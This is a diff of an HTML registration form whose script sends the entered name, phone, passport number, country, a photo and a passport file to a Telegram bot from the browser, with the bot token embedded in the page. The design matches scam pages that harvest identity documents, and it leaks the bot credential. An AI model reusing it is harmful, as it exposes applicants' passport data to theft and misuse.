@@ -2,42 +2,60 @@
 <html>
 <head>
 <title>Registration Form</title>
-
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
 <style>
-body {font-family: Arial; background:#f4f6f9;}
+body {
+    font-family: Arial;
+    background: linear-gradient(to right, #0d47a1, #1976d2);
+    margin:0;
+}
+
 .container {
-  background:white;
-  padding:25px;
-  margin:30px auto;
-  max-width:500px;
-  border-radius:15px;
-  box-shadow:0 10px 30px rgba(0,0,0,0.2);
+    background:white;
+    padding:25px;
+    margin:40px auto;
+    max-width:500px;
+    border-radius:15px;
 }
-input {width:100%; padding:12px; margin:8px 0;}
+
+input {
+    width:100%;
+    padding:12px;
+    margin:8px 0;
+}
+
 button {
-  background:#0d47a1;
-  color:white;
-  padding:14px;
-  border:none;
-  width:100%;
+    background:#0d47a1;
+    color:white;
+    padding:14px;
+    border:none;
+    width:100%;
 }
-img{width:100px; margin-top:10px; display:none;}
+
+#preview {width:100px; display:none; margin:auto;}
+
+#toast {
+position:fixed;
+bottom:20px;
+right:20px;
+background:green;
+color:white;
+padding:15px;
+display:none;
+}
 </style>
 
 <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
 <script>
-(function(){
-emailjs.init("YOUR_PUBLIC_KEY");
-})();
+(function(){ emailjs.init("YOUR_PUBLIC_KEY"); })();
 </script>
 
 </head>
 
 <body>
 
-<h2 style="text-align:center;">Registration Form</h2>
+<h2 style="text-align:center;color:white;">Registration Form</h2>
 
 <div class="container">
 
@@ -45,119 +63,93 @@ emailjs.init("YOUR_PUBLIC_KEY");
 
 <input type="text" id="name" placeholder="Name" required>
 <input type="text" id="phone" placeholder="Phone">
-<input type="text" id="name" placeholder="Name" required>
-<input type="text" id="gender" placeholder="Gender">
-<input type="number" id="age" placeholder="Age">
-<input type="date" id="dob">
-<input type="text" id="elmis" placeholder="ELMIS ID">
 <input type="text" id="passport" placeholder="Passport">
-<input type="text" id="phone" placeholder="Phone">
-<input type="text" id="birth" placeholder="Birth Place">
-<input type="text" id="visa" placeholder="Visa">
 <input type="text" id="country" placeholder="Country">
 
-<label>📸 Profile Photo</label>
-<input type="file" id="photo" accept="image/*">
-<img id="preview1">
+<label>📸 Photo</label>
+<input type="file" id="photo">
+<img id="preview">
 
-<label>🛂 Passport</label>
-<input type="file" id="passportFile" accept="image/*">
-<img id="preview2">
+<label>📄 Passport PDF</label>
+<input type="file" id="passportFile">
 
-<label>🎓 Education Document (PDF)</label>
-<input type="file" id="eduFile" accept=".pdf">
+<label>🎓 Education PDF</label>
+<input type="file" id="eduFile">
 
-<br><br>
 <button type="submit">Submit</button>
 
 </form>
 
 </div>
 
+<div id="toast">✅ Sent Successfully</div>
+
 <script>
+let token = "PUT_BOT_TOKEN";
+let chat_id = "PUT_CHAT_ID";
 
-// 🔐 TELEGRAM
-let token = "PUT_YOUR_TOKEN_HERE";
-let chat_id = "PUT_YOUR_CHAT_ID";
-
-// 📸 PREVIEW
-function preview(input, imgId){
-let file = input.files[0];
+// preview
+photo.onchange = ()=>{
+let file = photo.files[0];
 if(file){
-let reader = new FileReader();
-reader.onload = function(e){
-let img = document.getElementById(imgId);
-img.src = e.target.result;
-img.style.display = "block";
+preview.src = URL.createObjectURL(file);
+preview.style.display="block";
 }
-reader.readAsDataURL(file);
-}
-}
+};
 
-photo.onchange = () => preview(photo,"preview1");
-passportFile.onchange = () => preview(passportFile,"preview2");
-
-// 🚀 SUBMIT
-document.getElementById("form").addEventListener("submit", function(e){
+form.onsubmit = async (e)=>{
 e.preventDefault();
 
-let text = `
-New Registration
-
+let text = `New User:
 Name: ${name.value}
 Phone: ${phone.value}
-`;
+Passport: ${passport.value}
+Country: ${country.value}`;
 
-// 📩 TEXT
-fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+// Telegram text
+await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
 method:"POST",
 headers:{"Content-Type":"application/json"},
-body: JSON.stringify({chat_id,text})
+body:JSON.stringify({chat_id,text})
 });
 
-// 📸 IMAGE SEND
-function sendPhoto(file){
+// Photo
+let file = photo.files[0];
 if(file){
-let formData = new FormData();
-formData.append("chat_id", chat_id);
-formData.append("photo", file);
+let fd = new FormData();
+fd.append("chat_id",chat_id);
+fd.append("photo",file);
 
-fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
 method:"POST",
-body: formData
+body:fd
 });
 }
-}
 
-// 📄 PDF SEND
-function sendDocument(file){
-if(file){
-let formData = new FormData();
-formData.append("chat_id", chat_id);
-formData.append("document", file);
+// PDF
+let doc = passportFile.files[0];
+if(doc){
+let fd = new FormData();
+fd.append("chat_id",chat_id);
+fd.append("document",doc);
 
-fetch(`https://api.telegram.org/bot${token}/sendDocument`, {
+await fetch(`https://api.telegram.org/bot${token}/sendDocument`, {
 method:"POST",
-body: formData
+body:fd
 });
 }
-}
 
-// SEND FILES
-sendPhoto(photo.files[0]);
-sendPhoto(passportFile.files[0]);
-sendDocument(eduFile.files[0]);
-
-// 📧 EMAIL
-emailjs.send("YOUR_SERVICE_ID","YOUR_TEMPLATE_ID",{
-name: name.value,
-phone: phone.value
+// Email
+emailjs.send("YOUR_SERVICE","YOUR_TEMPLATE",{
+name:name.value,
+phone:phone.value
 });
 
-alert("Sent Successfully ✅");
+// toast
+toast.style.display="block";
+setTimeout(()=>toast.style.display="none",3000);
 
-});
-
+};
 </script>
 
 </body>
